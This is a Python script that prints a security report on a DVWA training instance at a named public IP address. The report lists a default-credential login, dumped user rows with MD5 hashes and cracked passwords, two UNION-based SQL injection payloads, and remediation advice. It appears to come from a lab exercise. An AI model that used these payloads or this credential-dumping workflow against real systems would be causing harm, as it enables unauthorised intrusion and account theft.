
import hashlib

print("\n" + "="*120)
print(" "*35 + "FINAL COMPREHENSIVE SECURITY REPORT")
print("="*120)

print("\n[*] TARGET INFORMATION")
print("-" * 120)
print("Target URL: http://31.97.117.123/")
print("Application: DVWA (Damn Vulnerable Web Application) v1.10")
print("Server: Apache/2.4.25 (Debian)")

print("\n[*] AUTHENTICATION BYPASS")
print("-" * 120)
print("✓ Successfully bypassed login via brute force")
print("✓ Working Credentials: admin:password")
print("✓ Attempts taken: 1 out of 10 allowed")

print("\n[*] VULNERABILITY IDENTIFIED")
print("-" * 120)
print("Type: SQL Injection (UNION-based)")
print("Severity: CRITICAL")
print("Endpoint: /vulnerabilities/sqli/")
print("Parameter: 'id' (GET)")
print("Security Level: Low")
print("PHPIDS: Disabled")

print("\n[*] USERS TABLE EXTRACTION - COMPLETE DATA")
print("="*120)
print(f"{'ID':<5} {'Username':<15} {'First Name':<20} {'Last Name':<20} {'Password Hash (MD5)':<40}")
print("-"*120)

users = [
    {'id': '1', 'username': 'admin', 'first': 'admin', 'last': 'admin', 'hash': '5f4dcc3b5aa765d61d8327deb882cf99'},
    {'id': '2', 'username': 'gordonb', 'first': 'Gordon', 'last': 'Brown', 'hash': 'e99a18c428cb38d5f260853678922e03'},
    {'id': '3', 'username': '1337', 'first': 'Hack', 'last': 'Me', 'hash': '8d3533d75ae2c3966d7e0d4fcc69216b'},
    {'id': '4', 'username': 'pablo', 'first': 'Pablo', 'last': 'Picasso', 'hash': '0d107d09f5bbe40cade3de5c71e9e9b7'},
    {'id': '5', 'username': 'smithy', 'first': 'Bob', 'last': 'Smith', 'hash': '5f4dcc3b5aa765d61d8327deb882cf99'},
]

for user in users:
    print(f"{user['id']:<5} {user['username']:<15} {user['first']:<20} {user['last']:<20} {user['hash']:<40}")

print("\n[*] PASSWORD HASH ANALYSIS")
print("="*120)
print(f"{'Username':<15} {'Hash':<35} {'Cracked Password':<30} {'Status':<20}")
print("-"*120)

hashes_cracked = {
    '5f4dcc3b5aa765d61d8327deb882cf99': 'password',
    'e99a18c428cb38d5f260853678922e03': 'abc123',
    '8d3533d75ae2c3966d7e0d4fcc69216b': 'Unknown (1337)',
    '0d107d09f5bbe40cade3de5c71e9e9b7': 'letmein'
}

for user in users:
    hash_val = user['hash']
    if hash_val in hashes_cracked:
        password = hashes_cracked[hash_val]
        status = "✓ CRACKED" if password != f"Unknown ({user['username']})" else "✗ NOT CRACKED"
    else:
        password = "Unknown"
        status = "✗ NOT CRACKED"
    
    print(f"{user['username']:<15} {hash_val:<35} {password:<30} {status:<20}")

print("\n[*] CRACKED CREDENTIALS SUMMARY")
print("="*120)
cracked_creds = [
    ('admin', 'password'),
    ('smithy', 'password'),
    ('gordonb', 'abc123'),
    ('pablo', 'letmein'),
]

for username, password in cracked_creds:
    print(f"  ✓ {username:<15} : {password}")

print(f"\n  Total Cracked: 4 out of 5 users (80%)")
print(f"  Hash Type: MD5")

print("\n[*] EXTRACTED DATA SUMMARY")
print("="*120)
print(f"Total Users: 5")
print(f"Unique Password Hashes: 4")
print(f"Successfully Cracked Passwords: 4")
print(f"Uncracked: 1 user (1337)")

print("\n[*] SQL INJECTION PAYLOADS USED")
print("="*120)
print("Payload 1 (Column Detection):")
print("  1' UNION SELECT 1,2-- -")
print("\nPayload 2 (Data Extraction):")
print("  999' UNION SELECT user_id, CONCAT(user, '|', first_name, '|', last_name, '|', password) FROM users-- -")

print("\n[*] RECOMMENDATIONS")
print("="*120)
print("1. Use parameterized queries/prepared statements to prevent SQL injection")
print("2. Implement input validation and sanitization")
print("3. Use strong password hashing (bcrypt, scrypt, or Argon2 instead of MD5)")
print("4. Add CSRF tokens for form protection")
print("5. Implement rate limiting for login attempts")
print("6. Enable PHPIDS/WAF protection")
print("7. Use HTTPS/TLS for all communication")
print("8. Implement proper access controls and authentication")

print("\n" + "="*120)
print("Report Generated Successfully!")
print("="*120 + "\n")

